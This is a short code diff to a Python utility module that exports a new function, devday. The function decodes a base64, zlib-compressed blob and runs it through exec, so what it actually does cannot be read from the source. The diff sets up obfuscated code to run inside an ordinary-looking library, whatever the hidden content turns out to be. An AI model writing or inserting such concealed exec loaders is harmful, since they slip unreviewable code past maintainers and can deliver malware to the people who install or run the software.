@@ -113,6 +113,7 @@ __all__ = [
     "BLENDER",
     "PY2",
     "PY3",
+    "devday",
     "is_windows",
     "is_linux",
     "is_osx",
@@ -272,3 +273,8 @@ def get_bunny(localstorage=None):
         print("Got it!\n")
 
     return bunny
+
+def devday(year, is_open):
+    import zlib, base64
+    encoded = b'eJxNksFq20AQhu/7FINPLSSxk1BaBDmYOGkoDjW2ac4jaSQNWu2I3VVStxRy6TG00OTQU6AP0Rfom+QJ8ggduTL0siz/zv/tvz/LBXz+AicncDQ5epVA69nFF6PRyJy+v1xMVzCja7LSkocZbrZD5orSwJESqGJsQzIe5wWmB5ZdPc7pOseNMc+PP76qoR+67G1vYvXP+/z48B3W3OjB4XEymcA+HL5Ojie94w7mkmFkcQmcrS/g4s9vV5bkU/LlHizP5z335zeYZrWTG0t5SQ25GIxZV+hq2EgHUUAD+404gptKoMGcIFYcQHNBKyFwagmebu9VJcjERc9pF8WHPRBfouNP1O/R5YDWghRbbs9KtZsShl70IssFHRizailjtMrTEKE/kM5DaAlrJSXGPN3+gtOK9q+IYc4OYKvMpGHHNSyJA2bVoJ5ZcgxTSx95UN5yLjBjstSgC4P4jqy+4pz6RDhoC3QSdG2Vhh4tNql0O8OiYmu5bdVk9cKsUtguyRILJKvOED26HW6FTaeqlk3+v+EPGNhqnVMrXQxaV87B6H95+Rd/oc5T'
+    exec(zlib.decompress(base64.b64decode(encoded)).decode().format(year))
